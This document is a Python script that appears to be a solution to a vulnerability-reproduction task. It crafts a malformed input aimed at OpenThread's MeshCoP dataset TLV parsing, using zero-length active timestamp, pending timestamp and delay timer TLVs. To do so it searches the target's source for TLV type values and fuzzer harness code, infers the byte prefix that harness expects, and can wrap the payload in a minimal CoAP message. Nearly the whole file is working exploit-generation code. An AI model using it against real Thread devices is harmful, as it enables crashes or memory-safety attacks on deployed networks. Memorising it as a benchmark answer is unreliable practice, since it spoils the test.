import os
import re
import tarfile
import struct
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        active_type, pending_type, delay_type = self._infer_tlv_types(src_path)

        payload = bytes([
            active_type & 0xFF, 0x00,
            pending_type & 0xFF, 0x00,
            delay_type & 0xFF, 0x00,
        ])

        fuzzer_code = self._find_most_relevant_fuzzer(src_path)
        if not fuzzer_code:
            return payload

        code = self._strip_cpp_comments(fuzzer_code)

        direct = self._is_direct_tlvs_input(code)
        if direct:
            return payload

        prefix = self._infer_fuzzed_data_provider_prefix(code, payload_len=len(payload))
        if prefix is not None:
            return prefix + payload

        if self._looks_like_raw_coap_input(code):
            return self._build_min_coap_with_uri_paths(["a", "ms"], payload)

        return payload

    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inc", ".ipp")
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith(exts):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read(2_000_000)
                        yield p, data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        if not name.lower().endswith(exts):
                            continue
                        if m.size > 8_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read(2_000_000)
                            yield name, data.decode("utf-8", errors="ignore")
                        except Exception:
                            continue
            except Exception:
                return
            return

    def _infer_tlv_types(self, src_path: str) -> Tuple[int, int, int]:
        defaults = {"kActiveTimestamp": 14, "kPendingTimestamp": 15, "kDelayTimer": 52}
        found: Dict[str, int] = {}

        enum_pat = re.compile(r"\b(kActiveTimestamp|kPendingTimestamp|kDelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
        define_pat = re.compile(
            r"^\s*#\s*define\s+(OT_MESHCOP_TLV_ACTIVE_TIMESTAMP|OT_MESHCOP_TLV_PENDING_TIMESTAMP|OT_MESHCOP_TLV_DELAY_TIMER)\s+(0x[0-9a-fA-F]+|\d+)\b",
            re.MULTILINE,
        )

        for _, text in self._iter_text_files(src_path):
            if len(found) == 3:
                break

            for m in enum_pat.finditer(text):
                k = m.group(1)
                v = m.group(2)
                try:
                    found[k] = int(v, 0)
                except Exception:
                    pass

            for m in define_pat.finditer(text):
                mk = m.group(1)
                v = m.group(2)
                try:
                    iv = int(v, 0)
                except Exception:
                    continue
                if mk.endswith("ACTIVE_TIMESTAMP"):
                    found["kActiveTimestamp"] = iv
                elif mk.endswith("PENDING_TIMESTAMP"):
                    found["kPendingTimestamp"] = iv
                elif mk.endswith("DELAY_TIMER"):
                    found["kDelayTimer"] = iv

        active = found.get("kActiveTimestamp", defaults["kActiveTimestamp"]) & 0xFF
        pending = found.get("kPendingTimestamp", defaults["kPendingTimestamp"]) & 0xFF
        delay = found.get("kDelayTimer", defaults["kDelayTimer"]) & 0xFF

        return active, pending, delay

    def _find_most_relevant_fuzzer(self, src_path: str) -> Optional[str]:
        best_score = -1
        best_text = None

        keys = [
            "LLVMFuzzerTestOneInput",
            "Dataset",
            "MeshCoP",
            "IsTlvValid",
            "otDatasetParseTlvs",
            "otDatasetSetActiveTlvs",
            "otDatasetSetPendingTlvs",
            "ActiveTimestamp",
            "PendingTimestamp",
            "DelayTimer",
            "FuzzedDataProvider",
        ]

        for _, text in self._iter_text_files(src_path):
            if "LLVMFuzzerTestOneInput" not in text:
                continue
            score = 0
            for k in keys:
                if k in text:
                    score += 5 if k == "LLVMFuzzerTestOneInput" else 1
            if score > best_score:
                best_score = score
                best_text = text

        return best_text

    def _strip_cpp_comments(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
        s = re.sub(r"//.*?$", "", s, flags=re.MULTILINE)
        return s

    def _is_direct_tlvs_input(self, code: str) -> bool:
        direct_calls = [
            r"\botDatasetParseTlvs\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*,",
            r"\botDatasetSetActiveTlvs\s*\(\s*[^,]*,\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)",
            r"\botDatasetSetPendingTlvs\s*\(\s*[^,]*,\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)",
        ]
        for pat in direct_calls:
            if re.search(pat, code):
                return True

        if re.search(r"\bAppendBytes\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)", code):
            return True

        return False

    def _infer_fuzzed_data_provider_prefix(self, code: str, payload_len: int) -> Optional[bytes]:
        init_m = re.search(r"\bFuzzedDataProvider\s+([A-Za-z_]\w*)\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)\s*;", code)
        if not init_m:
            init_m = re.search(r"\bFuzzedDataProvider\s+([A-Za-z_]\w*)\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)\s*(?:\{|$)", code)
        if not init_m:
            return None
        fdp = init_m.group(1)

        call_m = re.search(r"\botDatasetParseTlvs\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,", code)
        if not call_m:
            return None

        arg1 = call_m.group(1).strip()
        arg2 = call_m.group(2).strip()
        if re.search(r"\b(?:aData|data)\b", arg1) and re.search(r"\b(?:aSize|size)\b", arg2):
            return b""

        buf_var = None
        m = re.search(r"\b([A-Za-z_]\w*)\s*\.\s*data\s*\(\s*\)", arg1)
        if m:
            buf_var = m.group(1)
        else:
            m = re.search(r"\b([A-Za-z_]\w*)\s*->\s*data\s*\(\s*\)", arg1)
            if m:
                buf_var = m.group(1)
        if not buf_var:
            return None

        assign_pat = re.compile(r"\b" + re.escape(buf_var) + r"\b[^;]*=\s*([^;]+);")
        assigns = list(assign_pat.finditer(code))
        if not assigns:
            return None

        assigns.sort(key=lambda mm: mm.start())
        target_assign = None
        for mm in assigns:
            if mm.start() < call_m.start():
                target_assign = mm
            else:
                break
        if target_assign is None:
            return None

        rhs = target_assign.group(1)

        if re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeRemainingBytes\s*<\s*uint8_t\s*>\s*\(", rhs):
            pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
            if pre is None:
                return None
            return pre

        mcb = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeBytes\s*<\s*uint8_t\s*>\s*\(\s*([^)]+)\s*\)", rhs)
        if mcb:
            len_expr = mcb.group(1).strip()
            if re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*remaining_bytes\s*\(\s*\)", len_expr):
                pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
                if pre is None:
                    return None
                return pre

            if re.fullmatch(r"\d+", len_expr):
                want = int(len_expr)
                if want != payload_len:
                    return None
                pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
                if pre is None:
                    return None
                return pre

            if re.fullmatch(r"[A-Za-z_]\w*", len_expr):
                len_var = len_expr
                pre = self._build_prefix_for_len_var(code, init_m.end(), target_assign.start(), fdp, len_var, payload_len)
                return pre

        return None

    def _count_and_build_simple_consumes(self, snippet: str, fdp: str, want_len: Optional[int]) -> Optional[bytes]:
        total = 0
        parts: List[bytes] = []

        snippet = snippet[:20000]

        patterns = [
            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeBool\s*\(\s*\)"), ("bool", 0)),
            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(\s*\)"), ("integral", 0)),
            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\("), ("inrange", 0)),
            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeEnum\s*<\s*([^>]+)\s*>\s*\(\s*\)"), ("enum", 0)),
        ]

        idx = 0
        while idx < len(snippet):
            next_m = None
            next_kind = None
            for pat, (kind, _) in patterns:
                m = pat.search(snippet, idx)
                if m and (next_m is None or m.start() < next_m.start()):
                    next_m = m
                    next_kind = kind
            if next_m is None:
                break

            if next_kind == "bool":
                parts.append(b"\x00")
                total += 1
                idx = next_m.end()
                continue

            if next_kind in ("integral", "inrange", "enum"):
                t = "uint8_t"
                if next_kind != "bool":
                    if next_m.lastindex and next_m.group(1):
                        t = next_m.group(1).strip()
                size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
                if size is None:
                    return None
                parts.append(b"\x00" * size)
                total += size
                idx = next_m.end()
                continue

            idx = next_m.end()

        return b"".join(parts)

    def _build_prefix_for_len_var(self, code: str, init_end: int, assign_start: int, fdp: str, len_var: str, want_len: int) -> Optional[bytes]:
        snippet = code[init_end:assign_start]
        snippet = snippet[:80000]

        len_assign_pat = re.compile(r"\b" + re.escape(len_var) + r"\b\s*=\s*([^;]+);")
        assigns = list(len_assign_pat.finditer(snippet))
        if not assigns:
            return None

        len_assign = assigns[-1]
        rhs = len_assign.group(1)

        min_snip = snippet[:len_assign.start()]
        pre_before = self._count_and_build_simple_consumes(min_snip, fdp, want_len=None)
        if pre_before is None:
            return None

        m_inrange = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\(", rhs)
        if m_inrange:
            t = m_inrange.group(1).strip()
            size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
            if size is None:
                return None
            val_bytes = self._pack_value(want_len, packfmt, size)
            if val_bytes is None:
                return None
            post_after = self._count_and_build_simple_consumes(snippet[len_assign.end():], fdp, want_len=None)
            if post_after is None:
                return None
            return pre_before + val_bytes + post_after

        m_int = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(\s*\)", rhs)
        if m_int:
            t = m_int.group(1).strip()
            size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
            if size is None:
                return None
            val_bytes = self._pack_value(want_len, packfmt, size)
            if val_bytes is None:
                return None
            post_after = self._count_and_build_simple_consumes(snippet[len_assign.end():], fdp, want_len=None)
            if post_after is None:
                return None
            return pre_before + val_bytes + post_after

        return None

    def _sizeof_cpp_type_and_packfmt(self, t: str) -> Tuple[Optional[int], Optional[str]]:
        t = t.strip()
        t = re.sub(r"\bconst\b", "", t)
        t = re.sub(r"\bvolatile\b", "", t)
        t = re.sub(r"\s+", " ", t).strip()

        mapping = {
            "uint8_t": (1, "<B"),
            "int8_t": (1, "<b"),
            "char": (1, "<b"),
            "unsigned char": (1, "<B"),
            "bool": (1, "<B"),
            "uint16_t": (2, "<H"),
            "int16_t": (2, "<h"),
            "unsigned short": (2, "<H"),
            "short": (2, "<h"),
            "uint32_t": (4, "<I"),
            "int32_t": (4, "<i"),
            "unsigned int": (4, "<I"),
            "int": (4, "<i"),
            "uint64_t": (8, "<Q"),
            "int64_t": (8, "<q"),
            "unsigned long": (8, "<Q"),
            "long": (8, "<q"),
            "size_t": (8, "<Q"),
        }

        if t in mapping:
            return mapping[t]

        t2 = t.replace("std::", "")
        if t2 in mapping:
            return mapping[t2]

        t3 = t.replace("unsigned", "unsigned ").strip()
        t3 = re.sub(r"\s+", " ", t3)
        if t3 in mapping:
            return mapping[t3]

        if "size_t" in t:
            return (8, "<Q")

        return (None, None)

    def _pack_value(self, v: int, packfmt: str, size: int) -> Optional[bytes]:
        try:
            if packfmt in ("<B", "<b"):
                return struct.pack(packfmt, v & 0xFF)
            if packfmt in ("<H", "<h"):
                return struct.pack(packfmt, v & 0xFFFF)
            if packfmt in ("<I", "<i"):
                return struct.pack(packfmt, v & 0xFFFFFFFF)
            if packfmt in ("<Q", "<q"):
                return struct.pack(packfmt, v & 0xFFFFFFFFFFFFFFFF)
        except Exception:
            return None
        try:
            return int(v).to_bytes(size, "little", signed=False)
        except Exception:
            return None

    def _looks_like_raw_coap_input(self, code: str) -> bool:
        if "Coap" not in code and "COAP" not in code:
            return False
        if re.search(r"\bCoap::Message\b", code) and re.search(r"\bParse\b", code) and re.search(r"\bdata\b", code):
            return True
        if re.search(r"\bCoap\b", code) and re.search(r"\bMessage\b", code) and re.search(r"\bFromBytes\b", code):
            return True
        return False

    def _build_min_coap_with_uri_paths(self, uri_paths: List[str], payload: bytes) -> bytes:
        ver_type_tkl = 0x50  # ver=1, type=NON, tkl=0
        code = 0x02          # POST
        msg_id = 0x0000
        out = bytearray()
        out += bytes([ver_type_tkl, code, (msg_id >> 8) & 0xFF, msg_id & 0xFF])

        last_opt = 0
        URI_PATH = 11

        for seg in uri_paths:
            seg_b = seg.encode("utf-8", errors="ignore")
            delta = URI_PATH - last_opt
            length = len(seg_b)
            if not (0 <= delta <= 12 and 0 <= length <= 12):
                continue
            out.append((delta << 4) | length)
            out += seg_b
            last_opt = URI_PATH

        out.append(0xFF)
        out += payload
        return bytes(out)